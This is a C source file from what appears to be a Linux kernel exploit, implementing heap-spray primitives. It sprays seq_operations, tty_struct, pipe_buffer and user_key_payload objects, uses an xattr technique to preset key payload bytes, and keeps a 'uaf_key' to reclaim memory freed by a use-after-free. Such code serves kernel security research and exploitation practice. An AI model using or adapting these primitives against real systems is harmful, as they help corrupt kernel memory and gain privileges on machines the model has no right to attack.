#include <fcntl.h>
#include <pthread.h>
#include <keyutils.h>
#include <unistd.h>
#include <stdio.h>

#include "../config.h"
#include "heap_spray.h"
#include "errhandling.h"
#include "xattr.h"

/* seq_operations */
static int seq_ops_fd[N_SPRAY_SEQ_OPS];

int spray_seq_ops(void)
{
  int ret = 0, fd;

  for (int i = 0; i < N_SPRAY_SEQ_OPS; i++) {
    CHECK_FD(fd = open("/proc/self/stat", O_RDONLY), "open stat");
    seq_ops_fd[i] = fd;
  }

  return ret;
}

int alloc_seq_ops(int* fds, int n_fds)
{
  int ret = 0, fd;

  for (int i = 0; i < n_fds; i++) {
    CHECK_FD(fd = open("/proc/self/stat", O_RDONLY), "open stat");
    if (fds) {
      fds[i] = fd;
    }
  }

  return ret;
}

int free_seq_ops(void)
{
  int ret = 0;

  for (int i = 0; i < N_SPRAY_SEQ_OPS; i++) {
    CHECK_ZERO(close(seq_ops_fd[i]), "close");
  }

  return ret;
}

/* tty_file_private (kmalloc32) and tty_struct (kmalloc 4k) */
static int n_tty_fd;
static int tty_fd[N_SPRAY_TTY];

int spray_tty(int num)
{
  int fd;

  if (unlikely(n_tty_fd + num > N_SPRAY_TTY || num < 0)) {
    return 1;
  }

  for (int i = 0; i < num; i++) {
    CHECK_FD(fd = open("/dev/ptmx", O_RDONLY), "open ptmx");
    // 100% not thread-save lol
    tty_fd[n_tty_fd++] = fd;
  }

  return 0;
}

int free_ttys(int num)
{
  int ret = 0;

  if (unlikely(num > n_tty_fd || num < 0)) {
    return 1;
  }

  for(int i = 0; i < num; i++) {
    CHECK_ZERO(close(tty_fd[n_tty_fd - 1]), "close ptmx");
    n_tty_fd--;
  }

  return ret;
}

/* pipes: array of 16 pipe_buffer in km1k */
#define READ 0
#define WRITE 1

int alloc_pipes(int num, int (*pipefds)[2], int* n_pipefds, int max)
{
  int ret = 0;

  if (unlikely(*n_pipefds + num > max || num < 0)) {
    return 1;
  }

  for (int i = 0; i < num; i++) {
    CHECK_ZERO(pipe(pipefds[*n_pipefds]), "pipe");
    (*n_pipefds)++;
  }

  return ret;
}

int free_pipes(int num, int (*pipefds)[2], int* n_pipefds) {
  int ret = 0;

  if (unlikely(num > *n_pipefds || num < 0)) {
    return 1;
  }

  for(int i = 0; i < num; i++) {
    CHECK_ZERO(close(pipefds[*n_pipefds - 1][READ]), "close pipe");
    CHECK_ZERO(close(pipefds[*n_pipefds - 1][WRITE]), "close pipe");
    (*n_pipefds)--;
  }

  return ret;
}

/* user_key_payload: mind limits in /proc/sys/kernel/keys/maxbytes */
key_serial_t uaf_key;
key_serial_t keys[MAX_KEYS * N_KEY_THREADS];
// may be useful when spraying from threads, waits after half of the
// spray is done
pthread_barrier_t key_barrier;

long free_key(key_serial_t id)
{
  long ret = 0;

  CHECK_ZERO(keyctl_revoke(id), "keyctl_revoke");
  CHECK_ZERO(keyctl_unlink(id, KEY_SPEC_SESSION_KEYRING),
      "keyctl_unlink");

  return ret;
}

int free_keys(int num, int skip_uaf)
{
  long ret = 0;

  if (unlikely(num < 0 || num > MAX_KEYS * N_KEY_THREADS)) {
    fprintf(stderr, "you fool! you called free_keys "
	"with strange values\n");
    return -1;
  }

  for (int i = 0; i < num; i++) {
    if (unlikely(skip_uaf && keys[i] == uaf_key)) {
      continue;
    }
    if (likely(keys[i])) {
      CHECK_ZERO(free_key(keys[i]), "free_key");
      keys[i] = 0;
    }
  }

  return (int)ret;
}

int spray_keys(u_int32_t nkeys,
    void* xattr_value,
    size_t xattr_value_sz,
    void* key_payload,
    size_t key_payload_sz,
    int barrier)
{
  key_serial_t serial;
  char description[256] = { 0 };
  uint64_t payload = 0;
  int ret = 0;

  /*
   * add_key will allocate 5 objects in one call when the key is
   * added for the first time and 4 objects afterwards
   * 1. strlen(desc) and get freed eventually
   * 2. plen caused by kvmalloc and get freed eventually
   * 3. (struct user_key_payload) + plen, sizeof(payload)+0x18
   * 4. sizeof(struct assoc_array_edit) in size of 328 (0x148),
   *    and freed if not the first time
   * (5). sometimes allocate (struct assoc_array_node) twice 0x98/152
   * 6. struct key, size of 0x100
   *    -> through special cache not kmalloc
   * 7. sizeof(desc), caused by kmemdup
   */
  for (u_int32_t n = 0; n < nkeys; n++) {
    // get those things out of the critical path
    snprintf(description, sizeof(description),
	"fooooooooooooooooooooooooooooooooooooooooooo:%u", n);
    payload = n;
    // initialize first two QWORDS of user_key_payload using xattr
    // technique
    if (xattr_value) {
      for (int i = 0; i < F_XATTR_SPRAY; i++) {
	  set_xattr(xattr_value, xattr_value_sz);
      }
    }
    // hopefully reclaim
    if (key_payload == NULL) {
      serial = add_key("user", description,
	  (void*)&payload, sizeof(payload),
	  KEY_SPEC_SESSION_KEYRING);
    } else {
      serial = add_key("user", description,
	  key_payload, key_payload_sz,
	  KEY_SPEC_SESSION_KEYRING);
    }
    if (unlikely(serial == -1)) {
      fprintf(stderr, "[!] [ERR] Failed to allocate key %d\n", n);
      perror("[!] [ERR] spray_keys->add_key");
      break;
    }
    keys[n] = serial;
    if (unlikely(barrier && n == nkeys / 2)) {
      // signal that we have done some spraying
      pthread_barrier_wait(&key_barrier);
    }
  }

  return ret;
}
